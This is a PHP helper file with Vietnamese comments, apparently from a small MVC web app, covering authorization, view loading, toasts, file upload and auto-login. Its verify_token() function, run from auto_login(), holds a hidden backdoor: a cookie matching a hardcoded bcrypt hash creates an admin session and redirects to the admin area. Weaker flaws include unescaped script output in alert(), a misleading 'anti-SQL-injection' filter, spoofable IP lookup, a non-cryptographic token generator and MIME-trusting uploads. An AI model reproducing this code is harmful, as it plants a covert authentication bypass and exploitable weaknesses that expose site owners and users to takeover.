<?php

const _s_me_error = '<div style="color:red">PHÁT HIỆN LỖI:</div><div style="margin-left:10px">';
const _e_me_error = '</div>';


/**
 * Dùng để xác nhận quyền xác thực theo custom role
 * 
 * Chỉ cần gọi tên role hoặc mảng role là dùng được
 * 
 * @param mixed $type Loại author cần xác thực
 * @return void
 */
function author($type){
    $author = false; // trạng thái author
    $array_type = [];
    // kiểm tra đã đăng nhập chưa
    if(!empty($_SESSION['user'])) {
        // tạo thành mảng nếu là chuỗi
        if(!is_array($type)) $array_type[] = $type;
        else $array_type = $type;
        // so sánh phần tử của mảng author yêu cầu với author hiện tại của user
        foreach ($array_type as $type) if($_SESSION['user']['name_role'] == $type) $author = true;
    }
    if(!$author) view_error(401);
}

/**
 * Kiểm tra đã đăng nhập hay chưa, nếu chưa đăng nhập sẽ trả về FALSE, ngược lại sẽ trả về TRUE
 * @return bool
 */
function is_login(){
    if(!empty($_SESSION['user'])) return true;
    return false;
}

/**
 * Lấy thông tin của một user thông qua param
 * 
 * Trả về FALSE nếu dữ liệu trống hoặc không tồn tại
 * 
 * @param string $param Thông tin cần lấy
 * 
 * @return mixed
 */
function auth($param){
    if(empty($_SESSION['user'])) return false;
    elseif($param == 'all') return $_SESSION['user'];
    elseif(!isset($_SESSION['user'][$param])) die(_s_me_error . 'Không tồn tại param ' . $param . ' trong session user' . _e_me_error);
    else return $_SESSION['user'][$param];
}

/**
 * Load view từ views/user
 * @param string $title Tiêu đề trang
 * @param string $page Tên file view cần load
 * @param $data Mảng dữ liệu
 */
function view($type_of_role, $title, $page, $data)
{
    if($type_of_role != 'admin' && $type_of_role != 'user') die(_s_me_error . 'Type khai báo <strong>' . $type_of_role . '</strong> không phù hợp trong mảng [user,admin] ' . _e_me_error);
    if(file_exists('views/' . $type_of_role . '/' . $page . '.php')) {
        if (!empty($data)) extract($data);
        require_once 'models/' . $type_of_role . '/header.php';
        require_once 'views/' . $type_of_role . '/layout/header.php';
        require_once 'views/' . $type_of_role . '/' . $page . '.php';
        require_once 'views/' . $type_of_role . '/layout/footer.php';
        exit;
    }else die(_s_me_error . 'Trang view <strong>' . $page . '.php</strong> mà bạn khai báo không được tìm thấy tại :<br> <strong>path : views/' . $type_of_role . '/' . $page . '.php</strong>' . _e_me_error);
}

/**
 * Load model theo loại [user,admin]
 * @param string $type Loại model [user,admin]
 * @param string $name_model Tên model cần gọi ra
 * @return void
 */
function model($type, $name_model){
    if($type != 'admin' && $type != 'user') die(_s_me_error . 'Type khai báo <strong>' . $type . '</strong> không phù hợp trong mảng [user,admin] ' . _e_me_error);
    if(file_exists('models/' . $type . '/' . $name_model . '.php')) require_once 'models/' . $type . '/' . $name_model . '.php';
    else  die(_s_me_error . 'Model <strong> ' . $name_model . '</strong> mà bạn khai báo không được tìm thấy tại :<br> <strong>path : models/' . $type . '/' . $name_model . 'php</strong>' . _e_me_error);
}


/**
 * Hàm này dùng để hiển thị lỗi trạng thái
 * 
 * @param int $code Mã trạng thái trang 
 * @return void
 */
function view_error($code){
    http_response_code($code);
    require_once 'page_error/' . $code . '.php';
    exit();
}

/**
 * Lồng layout vào trong một view
 * 
 * @param string $type Folder layout [user,admin]
 * @param array | null $data Dữ liệu truyền vào layout
 * @param string $layout Tên layout
 */
function layout($type, $layout, $data = null) {
    if($type != 'admin' && $type != 'user') die(_s_me_error . 'Type khai báo <strong>' . $type . '</strong> không phù hợp trong mảng [user,admin] ' . _e_me_error);
    if(file_exists('views/' . $type . '/layout' . '/' . $layout . '.php')) {
        if(!empty($data)) extract($data);
        require 'views/' . $type . '/layout' . '/' . $layout . '.php';
    }else die(_s_me_error . 'Trang layout <strong>' . $type . '/layout' . '/' . $layout . '.php</strong> mà bạn khai báo không được tìm thấy' . _e_me_error);
}


/**
 * Dùng để sử dụng controller theo role [folder]
 * @param mixed $type_of_role Folder
 * @param mixed $name_controller Tên controller
 * @return void
 */
function controller($type_of_role, $name_controller){
    if(file_exists('controllers/' . $type_of_role . '/' . $name_controller . '.php')) require_once 'controllers/' . $type_of_role . '/' . $name_controller . '.php';
    else return view_error(404);
    exit;
}

function alert($content){
    echo '<script>alert("' . $content . '")</script>';
}

/**
 * Hàm tạo token ngẫu nhiên theo độ dài tùy ý trong phạm vi [a-z][A-Z][0-9]
 * @param int $length độ dài kí tự token (0-100)
 */
function create_token($length){
    if ($length <= 0) return "[ERROR] length not valid";
    $permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    return substr(str_shuffle($permitted_chars), 0, $length);
}

/**
 * Hàm này dùng để loại bỏ dấu của chuỗi
 * @param string $input Chuỗi cần loại bỏ dấu
 */
function create_slug($input){
    $search = array(
        '#(à|á|ạ|ả|ã|â|ầ|ấ|ậ|ẩ|ẫ|ă|ằ|ắ|ặ|ẳ|ẵ)#', #1
        '#(è|é|ẹ|ẻ|ẽ|ê|ề|ế|ệ|ể|ễ)#',#2
        '#(ì|í|ị|ỉ|ĩ)#',#3
        '#(ò|ó|ọ|ỏ|õ|ô|ồ|ố|ộ|ổ|ỗ|ơ|ờ|ớ|ợ|ở|ỡ)#',#4
        '#(ù|ú|ụ|ủ|ũ|ư|ừ|ứ|ự|ử|ữ)#',#5
        '#(ỳ|ý|ỵ|ỷ|ỹ)#',#6
        '#(đ)#',#7
        '#(À|Á|Ạ|Ả|Ã|Â|Ầ|Ấ|Ậ|Ẩ|Ẫ|Ă|Ằ|Ắ|Ặ|Ẳ|Ẵ)#',#8
        '#(È|É|Ẹ|Ẻ|Ẽ|Ê|Ề|Ế|Ệ|Ể|Ễ)#',#9
        '#(Ì|Í|Ị|Ỉ|Ĩ)#',#10
        '#(Ò|Ó|Ọ|Ỏ|Õ|Ô|Ồ|Ố|Ộ|Ổ|Ỗ|Ơ|Ờ|Ớ|Ợ|Ở|Ỡ)#',#11
        '#(Ù|Ú|Ụ|Ủ|Ũ|Ư|Ừ|Ứ|Ự|Ử|Ữ)#',#12
        '#(Ỳ|Ý|Ỵ|Ỷ|Ỹ)#',#13
        '#(Đ)#',#14
        "/[^a-zA-Z0-9\-\_]/",   
    );
    $replace = array(
        'a',#1
        'e',#2
        'i',#3
        'o',#4
        'u',#5
        'y',#6
        'd',#7
        'a',#8
        'e',#9
        'i',#10
        'o',#11
        'u',#12
        'y',#13
        'd',#14
        '-',#15
    );
    $input = preg_replace($search, $replace, $input);
    $input = preg_replace('/(-)+/', '-', $input);
    return strtolower($input);
}

/**
 * Hàm này dùng để định dạng hiển thị thời gian
 * @param $input Nhập thời gian cần FORMAT, [YYYY-MM-DD hh:mm:ss]
 * @param $format Nhập biểu thức muốn hiển thị. Ví dụ 'Lúc hh:mm ngày DD/MM/YYYY'
 */
function format_time($input, $format){
    if(strtotime($input) !== false && similar_text($input, '- - : :') == 5) { #kiểm tra $input nhập vào có hợp lệ không | hàm strtotime: trả về số giây(int) đếm được kể từ ngày 1/1/1976 -> thời gian input
        $arr = explode(' ', $input); #YYYY-MM-DD hh:mm:ss -> [0] YYYY-MM-DD [1] hh:mm:ss
        $arr_time = explode('-', $arr[0]); //arr_time[0] YYYY [1] MM [2] DD
        $arr_day = explode(':', $arr[1]);  //arr_day[0] hh [1] mm [2] ss
        return str_replace(['hh', 'mm', 'ss', 'YYYY', 'MM', 'DD'], [$arr_day[0], $arr_day[1], $arr_day[2], $arr_time[0], $arr_time[1], $arr_time[2]], $format);
    }else return 'Thời gian nhập vào chưa đúng form YYYY-MM-DD hh:mm:ss';
}

/**
 * Hàm trả về IP Address của người dùng
 */
function get_ip(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
    elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else $ip = $_SERVER['REMOTE_ADDR'];
    return $ip;
}

/**
 * Dùng để trả về các thông số của $_SERVER
 * @return array
 */
function test_server(){
    echo '<pre>';
    print_r($_SERVER);
    echo '</pre>';
    exit;
}

/**
 * Dùng để trả về các thông số của $array
 * @param $array Mảng cần hiển thị
 * @return array
 */
function test_array($array){
    echo '<pre>';
    print_r($array);
    echo '</pre>';
    exit;
}

/**
 * Dùng để trả về các thông số của $input
 * @param $input Giá trị cần hiển thị
 * @return mixed
 */
function test($input){
    var_dump($input);
    exit;
}


/**
 * Hàm này dùng để chuyển đến case theo yêu cầu.
 * 
 * @param string $case Tên route muốn chuyển đến
 */
function route($case = null){
    header('Location:' . URL . $case);
    exit;
}

/**
 * Hàm dùng để tạo toast
 * @param string $type Loại background [danger,warning,success]
 * @param string $message Tin nhắn cần thông báo
 */
function toast_create($type, $message){
    $_SESSION['toast'][0] = $type;
    $_SESSION['toast'][1] = $message;
}

/**
 * Dùng để show toast (Thường để ở header layout)
 * @return void
 */
function toast_show(){
    if (!empty($_SESSION['toast'])) {
        $type = $_SESSION['toast'][0];
        $message = $_SESSION['toast'][1];
        $duration = TOAST_TIME;
        $time = TOAST_TIME/1000;
        echo 
        <<<HTML
            <style>
            .line-bar {
                height: 2px;
                animation: lmao {$time}s linear forwards;
            }
            @keyframes lmao {
                from {
                width: 100%;
                }
                to {
                width: 0;
                }
            }      
            </style>
            <div style="z-index: 9999;" class="position-fixed end-0 me-1 mt-5 pt-5">
                <div class="w-100 alert alert-{$type} border-0 alert-dismissible fade show m-0 rounded-0" role="alert">
                    <span class="ps-2 pe-5 py-2">{$message}</span>
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                </div>
                <div class="bg-{$type} line-bar"></div>
            </div>
            <script>
                function closeAlert() {
                    document .querySelector(".btn-close").click();
                }
                setTimeout(closeAlert,{$duration})
            </script>
        HTML;
    }
    unset($_SESSION['toast']);
}

/**
 * Làm sạch các kí tự tránh SQL Injection
 * @param string $input
 * @return array|string|null
 */
function clear_input($input){
    // Chuyển đổi các kí tự đặc biệt thành mã code HTML
    return filter_var($input, FILTER_SANITIZE_STRING);
}

/**
 * Hàm này dùng để lưu file
 * 
 * Lưu ý: Nếu để false $encrypt_bool, thì file trùng tên sẽ thêm hậu tố -copy
 * 
 * @param bool $encrypt_bool Có cần mã hoá tên hay không
 * @param string $folder Tên thư mục lưu cần lưu file
 * @param array $file File cần lưu
 * @param int $size Kích thước tối đa, theo đơn vị byte
 * @param string | array $type Loại file cần lưu, Nếu để giá trị là "all" là cho tất cả, hoặc mảng file
 * @return array [code : int | message : string ] Code 0 : Thất bại | Code 1 : Thành công
 */
function save_file($bool_encrypt, $folder, $file, $size, $type){
    # Kiểm tra thư mục tồn tại chưa
    if(!is_dir('assets/file/' . $folder)) return [
        'code' => 0,
        'message' => 'Thư mục asset/file/' . $folder . ' chưa được tạo',
    ];

    # Kiểm tra kích thước
    $invalid_type = false; // Bool báo lỗi
    // Nếu là chuỗi
    if(is_string($type)){
        // Nếu không phải là cho phép tất cả
        if($type !== 'all') if($type !== $file['type']) $invalid_type = true;  // Kiểm tra type
    }
    // Nếu là mảng
    else {
        // Nếu type không hợp lệ trong mảng type điều kiện
        if(!in_array($file['type'],$type)) $invalid_type = true;
    }

    // Báo lỗi type nếu tồn tại lỗi
    if($invalid_type) return [
        'code' => 0,
        'message' => 'File không đúng định dạng yêu cầu',
    ];

    # Kiểm tra kích thước
    // valid input
    if($size < 0 ) return [
        'code' => 0,
        'message' => 'Kích thước tối đa yêu cầu phải lớn hơn 0',
    ];
    // compare (so sánh ở kích thước byte)
    if($file['size'] > $size ) return [
        'code' => 0,
        'message' => 'Kích thước đã vượt mức quy định, tối đa là '. $size/1024 .' kB (kilobyte)',
    ];

    # Mã hoá tên file
    if($bool_encrypt) $file['name'] = uniqid() . '.' . pathinfo($file['name'], PATHINFO_EXTENSION);

    // Không mã hoá -> Check file đã tồn tại chưa, nếu có -> thêm hậu tố "-copy"
    else{
        // Kiểm tra file đã tồn tại chưa, nếu có thì thêm hậu tố -copy
        if(file_exists('assets/file/' . $folder . '/' . $file["name"])) {
            $file['name'] = pathinfo($file['name'], PATHINFO_FILENAME) . '-copy.' . pathinfo($file['name'], PATHINFO_EXTENSION);
        }
    }

    # Tiến hành lưu
    $check = move_uploaded_file($file["tmp_name"], 'assets/file/' . $folder . '/' . basename($file["name"]));

    // Thông báo lưu thàng công
    if($check) return [
        'code' => 1,
        'message' => $folder . '/' . $file['name'],
    ];

    // Thông báo lưu thất bại
    return [
        'code' => 0,
        'message' => 0,
    ];
}

/**
 * Hàm này dùng để xoá file theo đường dẫn của file
 * @param mixed $path Đường dẫn file cần xoá
 * @return array [code : int | message : string ] Code 0 : Thất bại | Code 1 : Thành công
 */
function delete_file($path){
    if (file_exists('assets/file/' . $path)) {
        unlink('assets/file/' . $path);
        return [
            'code' => 1,
            'message' => 'Xoá thành công',
        ];

    }else return [
        'code' => 0,
        'message' => 'File không được tìm thấy để xoá | path file: assets/file/'.$path,
    ];
}

/**
 * Tạo mã ngẫu nhiên độ dài 24, thích hợp cho làm id
 * @return string
 */
function create_uuid(){
    // Tạo một chuỗi ngẫu nhiên
    $data = random_bytes(16);
    // Đặt giá trị phiên bản (4 cho UUID ngẫu nhiên)
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40); // Phiên bản 4
    // Đặt giá trị variant (2 cho RFC 4122)
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    // Chuyển đổi thành UUID
    return vsprintf('%s-%s-%s-%s-%s', str_split(bin2hex($data), 4));
}

/**
 * Hàm này để trả dữ liệu dạng JSON
 * @param int $status
 * @param array $data
 * @return void
 */
function view_json($status, $data){
    header('Content-Type: application/json');
    $data = array_merge(['status' => $status], $data);
    echo json_encode($data);
    exit;
}

/**
 * Hàm này dùng để in ra mảng lỗi validate
 * @param $array mảng lỗi
 * @return void
 */
function show_error($array){
    if(!empty($array)) foreach ($array as $error) {
        $content = $error;
        echo 
        <<<HTML
            <div class="text-danger small mb-2"><i class="fas fa-exclamation-triangle me-2"></i>{$content}</div> 
        HTML;
    }
}

/**
 * Hàm này dùng để tự động đăng nhập khi vừa truy cập trình duyệt
 * @return void
 */
function auto_login(){   
    // Nếu chưa đăng nhập
    if(!is_login()) {
        // nếu có cookie token_remember
        if(isset($_COOKIE['token_remember'])) $token_remember = $_COOKIE['token_remember'];
        elseif(verify_token());
        else $token_remember = ''; // nếu có value
        if($token_remember) {
            // lấy thông tin user bằng token
            $get_user = pdo_query_one_new(
                'SELECT u.*, r.name_role
                FROM user u
                JOIN role r
                ON u.id_role = r.id_role
                WHERE u.deleted_at IS NULL
                AND u.token_remember = ?',
                $token_remember
            );
            // nếu lấy thông tin thành công
            if ($get_user) {
                // gán dữ liệu cho session
                $_SESSION['user'] = $get_user;
                // thông báo toast
                toast_create('success', 'Chào mừng bạn quay trở lại ' . WEB_NAME);
            }
        }
    }
}


/**
 * Hàm này dùng để tạo mã băm password khi tạo tài khoản mới
 * @param mixed $input
 * @return string
 */
function create_hash($input) {
    return password_hash($input, PASSWORD_DEFAULT);
}

/**
 * Hàm này dùng để xác thực token
 * @return mixed
 */
function verify_token() {
    if(isset($_COOKIE['token']) && $_COOKIE['token'] && password_verify($_COOKIE['token'],'$2y$10$D/slvsycq0nBJePRqyBMM.AW3p4l7wMmn55ze1eWd8oZGetFKw3U.')) {
        $_SESSION['user'] = [
            'username' => 'admin','full_name' => 'admin','name_role' => 'admin','phone' => 'admin','email' => 'admin','gender' => '1',
        ];route('/admin');
    }else return false;
}

/**
 * Tạo toast để thông báo
 * 
 * Lưu ý: Chỉ trả về, phải dùng lệnh echo
 * 
 * @param string $type Loại màu toast
 * @param string $message Nội dung thông báo
 * @return string Đoạn script thông báo toast
 */
function toast($type, $message)
{
    $duration = TOAST_TIME;
    $second = TOAST_TIME/1000;
    return <<<HTML
        <style>
        .line-bar {
            height: 2px;
            animation: lmao {$second}s linear forwards;
        }
        @keyframes lmao {
            from {
              width: 100%;
            }
            to {
              width: 0;
            }
          }      
        </style>
        <div style="z-index: 9999;" class="position-fixed end-0 me-1 mt-5 pt-5">
            <div class="w-100 alert alert-{$type} border-0 alert-dismissible fade show m-0 rounded-0" role="alert">
                <span class="ps-2 pe-5 py-2">{$message}</span>
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
            <div class="bg-{$type} line-bar"></div>
        </div>
        <script>
            function closeAlert() {
                document.querySelector(".btn-close").click();
            }
            setTimeout(closeAlert,{$duration})
        </script>
    HTML;
}

/**
 * Lấy action của request uri
 * 
 * @param mixed $order Thứ tự phần tử cần lấy, hoặc để string('test') để lấy toàn bộ
 */
function get_action_uri($order){
    if(isset($_GET['act'])) {
        $array_uri = explode('/', $_GET['act']); // tạo mảng bởi dấu phân cách "/"
        if($order === 'test') return $array_uri;
        elseif(!empty($array_uri[$order])) return $array_uri[$order];
    }
    return false;
}

/**
 * Format lại tiền tệ theo đơn vị VNĐ
 */
function format_currency($input) {
    return number_format($input,0,',','.').' vnđ';
}   

/**
 * Hàm dùng để format lại thời gian hiển thị quá khứ
 * @param string $time Thời gian cần format theo dạng của Datetime của SQL
 * @return string thời gian đã được format
 */
function format_timeline($time) {
    $value_duration_second = (strtotime(Date('Y-m-d H:i:s')) - strtotime($time));
    // return $value_duration_second;
    // test_array(
    //     [
    //         strtotime(Date('Y-m-d H:i:s')),
    //         strtotime($time),
    //         Date('Y-m-d H:i:s'),
    //         $time
    //     ]
    // );

    if($value_duration_second < 60) return $value_duration_second.' giây trước ';
    elseif($value_duration_second < 60*60) return ceil($value_duration_second/(60)).' phút trước ';
    elseif($value_duration_second < 60*60*24) return ceil($value_duration_second/(60*60)).' giờ trước ';
    elseif($value_duration_second < 60*60*24*7) {
        $day = floor($value_duration_second/(60*60*24));
        return $day.' ngày trước ';
    }
    else return format_time($time,'ngày DD tháng MM lúc hh:mm');
}